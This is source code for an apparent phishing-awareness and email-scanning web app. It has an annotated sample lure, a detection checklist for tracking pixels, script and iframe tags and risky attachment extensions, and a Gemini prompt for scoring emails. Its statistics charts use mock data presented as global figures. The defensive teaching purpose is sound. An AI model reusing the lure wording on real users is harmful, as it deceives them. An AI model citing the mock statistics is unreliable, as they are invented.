    { id: "body", label: "We detected unusual activity. Click below to verify your identity or your account will be DELETED.", risk: "HIGH", info: "Threats of account deletion or financial loss are classic social engineering tactics." },
    { id: "link", label: "[ VERIFY ACCOUNT NOW ]", risk: "HIGH", info: "Hover (don't click!) to see the actual URL. If it looks short (bit.ly), messy, or doesn't match the company, it's a trap." }
  ];

  return (
    <div style={{ maxWidth: "1200px", margin: "0 auto" }}>
      <div style={{ textAlign: "center", marginBottom: "3rem" }}>
        <h2 style={{ fontSize: "2.5rem", color: "var(--accent-cyber)", marginBottom: "1rem" }}>ANATOMY OF A PHISH</h2>
        <p style={{ color: "#aaa", maxWidth: "600px", margin: "0 auto" }}>
          Hover over the different parts of this email to learn how to spot both visible AND invisible red flags.
        </p>
      </div>
      
      {/* Education Modules Selector */}
      <div style={{ display: "flex", gap: "1rem", justifyContent: "center", marginBottom: "2rem" }}>
        <div style={{ padding: "1rem", border: "1px solid var(--accent-danger)", borderRadius: "4px", background: "rgba(255,0,85,0.1)", maxWidth: "500px" }}>
            <strong style={{ color: "var(--accent-danger)", display: "block", marginBottom: "0.5rem" }}>NEW: SILENT THREATS (ZERO-CLICK)</strong>
            <p style={{ fontSize: "0.9rem", color: "#ddd" }}>
                Some attacks happen just by <strong>OPENING</strong> an email. Attackers embed invisible images ("pixels") or malicious scripts. 
                Modern email clients try to block these, but older or misconfigured ones are vulnerable.
            </p>
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1.5fr 1fr", gap: "3rem", alignItems: "start" }}>
        
        {/* Interactive Email */}
        <div style={{ 
          background: "#fff", 
          color: "#000", 
          borderRadius: "8px", 
          overflow: "hidden",
          boxShadow: "0 0 30px rgba(0,0,0,0.5)",
          position: "relative"
        }}>
          {/* Hidden Pixel Visualizer */}
          <div 
             onMouseEnter={() => setHoveredPart("pixel")}
             onMouseLeave={() => setHoveredPart(null)}
             style={{ 
                height: "20px", background: "#eee", borderBottom: "1px dashed #ccc", 
                display: "flex", alignItems: "center", justifyContent: "center", fontSize: "0.7rem", color: "#888", cursor: "help",
                backgroundColor: hoveredPart === "pixel" ? "rgba(255, 0, 85, 0.1)" : "#eee"
             }}>
             [ INVISIBLE TRACKING ELEMENT HIDDEN HERE ]
          </div>

          <div style={{ background: "#f5f5f5", padding: "1rem", borderBottom: "1px solid #ddd" }}>
            {emailParts.slice(1, 3).map(part => (
              <div 
                key={part.id}
                onMouseEnter={() => setHoveredPart(part.id)}
                onMouseLeave={() => setHoveredPart(null)}
                style={{ 
                  padding: "0.5rem", 
                  marginBottom: "0.25rem", 
                  cursor: "help",
                  background: hoveredPart === part.id ? "rgba(255, 0, 85, 0.1)" : "transparent",
                  border: hoveredPart === part.id ? "1px solid #ff0055" : "1px solid transparent",
                  borderRadius: "4px",
                  fontWeight: part.id === "sender" ? "bold" : "normal"
                }}
              >
                {part.label}
              </div>
            ))}
          </div>
          <div style={{ padding: "2rem" }}>
            {emailParts.slice(3).map(part => (
               <div 
                key={part.id}
                onMouseEnter={() => setHoveredPart(part.id)}
                onMouseLeave={() => setHoveredPart(null)}
                style={{ 
                  padding: "1rem", 
                  marginBottom: "1rem", 
                  cursor: "help",
                  background: hoveredPart === part.id ? "rgba(255, 0, 85, 0.1)" : "transparent",
                  border: hoveredPart === part.id ? "1px dashed #ff0055" : "1px solid transparent",
                  borderRadius: "4px",
                  display: part.id === "link" ? "inline-block" : "block",
                  color: part.id === "link" ? "blue" : "inherit",
                  textDecoration: part.id === "link" ? "underline" : "none",
                  fontWeight: part.id === "link" ? "bold" : "normal"
                }}
              >
                {part.label}
              </div>
            ))}
            <div style={{ marginTop: "2rem", color: "#666", fontSize: "0.8rem" }}>
              Regards,<br/>
              Security Team
            </div>
          </div>
        </div>

        {/* Explainer Panel */}
        <div style={{ position: "sticky", top: "2rem" }}>
          <h3 style={{ borderBottom: "1px solid #333", paddingBottom: "1rem", color: "#fff" }}>THREAT INTELLIGENCE</h3>
          
          {hoveredPart ? (
            <div style={{ animation: "fadeIn 0.2s" }}>
              {emailParts.filter(p => p.id === hoveredPart).map(p => (
                 <div key={p.id}>
                    <div style={{ 
                      display: "inline-block", 
                      background: p.risk === "HIGH" ? "var(--accent-danger)" : p.risk === "MED" ? "var(--accent-warning)" : "var(--accent-safe)",
                      color: "#000",
                      padding: "0.25rem 0.5rem",
                      fontWeight: "bold",
                      fontSize: "0.8rem",
                      marginBottom: "1rem",
                      borderRadius: "4px"
                    }}>
                      RISK LEVEL: {p.risk}
                    </div>
                    <p style={{ fontSize: "1.2rem", lineHeight: "1.6", color: "#fff" }}>{p.info}</p>
                 </div>
              ))}
            </div>
          ) : (
            <div style={{ color: "#666", fontStyle: "italic", marginTop: "2rem" }}>
              <div style={{ marginBottom: "1rem", fontSize: "3rem", opacity: 0.2 }}>?</div>
              Hover over any section of the email on the left (including the top bar) to analyze its components.
            </div>
          )}
        </div>

      </div>
    </div>
  );
};

const StatsView = () => {
  // Mock data for visualizations
  const targetData = [
    { label: "MICROSOFT", value: 35, color: "#00a4ef" },
    { label: "GOOGLE", value: 25, color: "#4285f4" },
    { label: "FINANCE", value: 20, color: "#00cc66" },
    { label: "LOGISTICS", value: 12, color: "#ffcc00" },
    { label: "OTHER", value: 8, color: "#666" }
  ];

  const methodData = [
    { label: "CREDENTIAL HARVEST", value: 60, color: "var(--accent-danger)" },
    { label: "MALWARE DELIVERY", value: 25, color: "var(--accent-warning)" },
    { label: "BEC / FRAUD", value: 15, color: "var(--accent-cyber)" }
  ];

  return (
    <div style={{ maxWidth: "1200px", margin: "0 auto" }}>
      <h2 style={{ fontSize: "2rem", color: "var(--accent-cyber)", marginBottom: "2rem", borderBottom: "1px solid #333", paddingBottom: "1rem" }}>
        GLOBAL PHISHING STATISTICS (2024-2025)
      </h2>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "2rem" }}>
        
        {/* Top Targeted Brands */}
        <div style={styles.card}>
          <h3 style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
            <Icons.ChartBar /> MOST IMPERSONATED BRANDS
          </h3>
          <p style={{ color: "#888", fontSize: "0.9rem", marginBottom: "1.5rem" }}>
            Sector breakdown of high-value targets.
          </p>
          <DonutChart data={targetData} title="TARGET DISTRIBUTION" />
        </div>

        {/* Attack Methods */}
        <div style={styles.card}>
          <h3 style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
            <Icons.AlertOctagon /> ATTACK METHODOLOGY
          </h3>
          <p style={{ color: "#888", fontSize: "0.9rem", marginBottom: "1.5rem" }}>
            Primary vectors used in successful breaches.
          </p>
          <DonutChart data={methodData} title="VECTOR ANALYSIS" />
        </div>
      </div>

      {/* Trend Chart */}
      <div style={{ ...styles.card, marginTop: "2rem" }}>
          <h3 style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
            <Icons.Activity /> ATTACK VOLUME TRENDS (6 MONTHS)
          </h3>
          <p style={{ color: "#888", fontSize: "0.9rem", marginBottom: "1.5rem" }}>
            Comparison of high-risk Phishing vs. general Spam/Marketing noise.
          </p>
          <TrendChart />
      </div>

      <div style={{ ...styles.card, marginTop: "2rem", display: "flex", gap: "2rem", alignItems: "center" }}>
        <div style={{ flex: 1 }}>
           <h3 style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
             <Icons.Zap /> COMMON PSYCHOLOGICAL TRIGGERS
           </h3>
           <div style={{ display: "flex", flexWrap: "wrap", gap: "1rem", marginTop: "1rem" }}>
            {[
              { label: "URGENCY", size: "2rem", opacity: 1, color: "var(--accent-danger)" },
              { label: "CURIOSITY", size: "1.5rem", opacity: 0.8, color: "var(--accent-warning)" },
              { label: "FEAR", size: "1.8rem", opacity: 0.9, color: "var(--accent-danger)" },
              { label: "GREED", size: "1.2rem", opacity: 0.7, color: "#fff" },
              { label: "HELPFULNESS", size: "1.1rem", opacity: 0.6, color: "#fff" },
              { label: "AUTHORITY", size: "1.6rem", opacity: 0.85, color: "var(--accent-cyber)" }
            ].map((tag, i) => (
              <span key={i} style={{ 
                fontSize: tag.size, 
                opacity: tag.opacity, 
                color: tag.color, 
                fontWeight: "bold",
                border: "1px solid #333",
                padding: "0.5rem 1rem",
                borderRadius: "50px",
                background: "rgba(255,255,255,0.05)"
              }}>
                {tag.label}
              </span>
            ))}
          </div>
        </div>
        <div style={{ width: "1px", height: "150px", background: "#333" }}></div>
        <div style={{ flex: 0.6, paddingLeft: "1rem" }}>
             <strong style={{ color: "#fff", display: "block", marginBottom: "0.5rem" }}>DID YOU KNOW?</strong>
             <p style={{ color: "#aaa", fontSize: "0.9rem", lineHeight: "1.6" }}>
               91% of all cyber attacks begin with a phishing email. The average employee receives 14 malicious emails per year. Spam makes up 45% of all email traffic globally.
             </p>
        </div>
      </div>
    </div>
  );
};

// --- Component: App ---

function App() {
  const [activeTab, setActiveTab] = useState<"SCANNER" | "EDUCATION" | "STATS">("SCANNER");
  const [emailText, setEmailText] = useState("");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<AnalysisResult | null>(null);
  const [groundingSources, setGroundingSources] = useState<GroundingSource[]>([]);

  const loadSample = () => {
    setEmailText(SAMPLE_PHISHING_EMAIL);
    setResult(null);
    setGroundingSources([]);
  };

  const analyzeEmail = async () => {
    if (!emailText.trim()) return;

    setLoading(true);
    setResult(null);
    setGroundingSources([]);

    try {
      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY || "" });
      
      const prompt = `
        You are a highly advanced cybersecurity defense system.
        
        TASK:
        1. DECODE THE INPUT: The input may contain raw MIME-encoded headers (e.g. '=?us-ascii?Q?...') or Base64 content. You MUST internally decode this to understand the true sender, subject, and body.
        2. Analyze the decoded content for phishing indicators, social engineering, and technical anomalies.
        3. SPAM CLASSIFICATION: Determine if this is Spam (unwanted marketing, newsletters) vs Phishing (malicious). 
           - Assign a 'spamScore' (0-100) specifically for spam characteristics (unsub link, marketing language, bulk sender patterns).
           - Categorize as: LEGITIMATE, MARKETING, NEWSLETTER, SCAM, or UNKNOWN.
        4. SPECIFICALLY CHECK FOR PASSIVE THREATS:
           - Look for 'pixel trackers' (1x1 images from external domains).
           - Look for dangerous HTML tags like <script>, <iframe>, <object>, <embed>.
           - Look for suspicious attachment extensions in the text/headers (.exe, .scr, .vbs, .js).
        5. CALCULATE RISK DIMENSIONS (0-100):
           - Technical: Header anomalies, SPF/DKIM (simulated), weird domains.
           - Content: Spelling, layout, bad images.
           - Social: Urgency, authority, fear tactics.
           - Reputation: Sender domain quality, known blacklist (simulated/search).
        6. Use Google Search to VERIFY the sender domain reputation, check for known scams matching the subject line, and validate any claims.
        7. Determine a Verdict: SAFE, SUSPICIOUS, or MALICIOUS.
        
        RAW EMAIL DATA (May include MIME encoded headers):
        """
        ${emailText}
        """
        
        OUTPUT FORMAT:
        Return ONLY a raw JSON object. Do not wrap in markdown code blocks.
        {
          "verdict": "SAFE" | "SUSPICIOUS" | "MALICIOUS",
          "riskScore": number (0-100),
          "confidence": number (0-100),
          "summary": "Executive summary...",
          "spamAnalysis": {
            "isSpam": boolean,
            "spamScore": number,
            "category": "LEGITIMATE" | "MARKETING" | "NEWSLETTER" | "SCAM" | "UNKNOWN",
            "indicators": ["Indicator 1", "Indicator 2"]
          },
          "riskDimensions": {
            "technical": number,
            "content": number,
            "social": number,
            "reputation": number
          },
          "technicalAnalysis": {
            "domainReputation": "Findings...",
            "authenticationChecks": "Checks..."
          },
          "passiveAnalysis": {
            "hasTrackingPixels": boolean,
            "hasDangerousAttachments": boolean,
            "hasScriptsOrIframes": boolean,
            "details": "Explanation of passive threats found..."
          },
          "socialEngineering": {
            "tacticsUsed": ["Urgency", "Scarcity", etc...],
            "urgencyLevel": "LOW" | "MEDIUM" | "HIGH"
          },
          "webIntelligence": "Search findings...",
          "recommendations": ["Action 1", "Action 2"]
        }
      `;

      const response = await ai.models.generateContent({
        model: "gemini-2.5-flash",
        contents: prompt,
        config: {
          tools: [{ googleSearch: {} }],
          temperature: 0.1, 
        }
      });

      const text = response.text || "";
      
      // Robust JSON Extraction: Find the first '{' and the last '}'
      const firstOpen = text.indexOf('{');
      const lastClose = text.lastIndexOf('}');
      let cleanJson = text;
      
      if (firstOpen !== -1 && lastClose !== -1 && lastClose > firstOpen) {
        cleanJson = text.substring(firstOpen, lastClose + 1);
      }
      
      let json: AnalysisResult;
      
      try {
        json = JSON.parse(cleanJson);
      } catch (e) {
        console.error("JSON Parse Error", e);
        console.log("Raw Text:", text);
        // Fallback object
        json = {
          verdict: "SUSPICIOUS",
          riskScore: 50,
          confidence: 0,
          summary: "Error parsing model output. The model might have been confused by the raw headers. Please try cleaning the input or re-scanning.",
          spamAnalysis: { isSpam: false, spamScore: 50, category: "UNKNOWN", indicators: [] },
          riskDimensions: { technical: 50, content: 50, social: 50, reputation: 50 },
          technicalAnalysis: { domainReputation: "Unknown", authenticationChecks: "Unknown" },
          passiveAnalysis: { hasTrackingPixels: false, hasDangerousAttachments: false, hasScriptsOrIframes: false, details: "Analysis incomplete due to parsing error." },
          socialEngineering: { tacticsUsed: ["Error"], urgencyLevel: "MEDIUM" },
          webIntelligence: "Analysis failed to format correctly.",
          recommendations: ["Manually review email."]
        };
      }

      const chunks = response.candidates?.[0]?.groundingMetadata?.groundingChunks || [];
      const sources: GroundingSource[] = chunks
        .filter(c => c.web?.uri && c.web?.title)
        .map(c => ({ title: c.web!.title!, uri: c.web!.uri! }));

      setResult(json);
      setGroundingSources(sources);

    } catch (error) {
      console.error("Analysis failed", error);
      alert("System Error: Analysis protocols failed.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={styles.container}>
      {/* Header */}
      <header style={styles.header}>
        <div style={styles.title}>
          <div style={{ color: "var(--accent-cyber)" }}><Icons.ShieldCheck /></div>
          <span>PhishGuard<span style={{ color: "var(--accent-cyber)" }}>.AI</span></span>
        </div>
        <div style={{ fontSize: "0.8rem", color: "var(--text-secondary)", fontFamily: "monospace" }}>
          SYSTEM: ONLINE | v2.6.2
        </div>
      </header>

      {/* Navigation */}
      <nav style={styles.nav}>
        <button style={styles.navButton(activeTab === "SCANNER")} onClick={() => setActiveTab("SCANNER")}>
          <Icons.Search /> Active Scanner
        </button>
        <button style={styles.navButton(activeTab === "EDUCATION")} onClick={() => setActiveTab("EDUCATION")}>
          <Icons.BookOpen /> Threat Intel Academy
        </button>
        <button style={styles.navButton(activeTab === "STATS")} onClick={() => setActiveTab("STATS")}>
          <Icons.ChartBar /> Global Stats
        </button>
      </nav>

      {/* Main Content Area */}
      <main>
        {activeTab === "SCANNER" && (
          <ScannerView 
            emailText={emailText} 
            setEmailText={setEmailText} 
            loading={loading}
            analyzeEmail={analyzeEmail}
            loadSample={loadSample}
            result={result}
            groundingSources={groundingSources}
          />
        )}
        {activeTab === "EDUCATION" && <EducationView />}
        {activeTab === "STATS" && <StatsView />}
      </main>

    </div>
  );
}

const root = ReactDOM.createRoot(document.getElementById("root") as HTMLElement);
root.render(<App />);
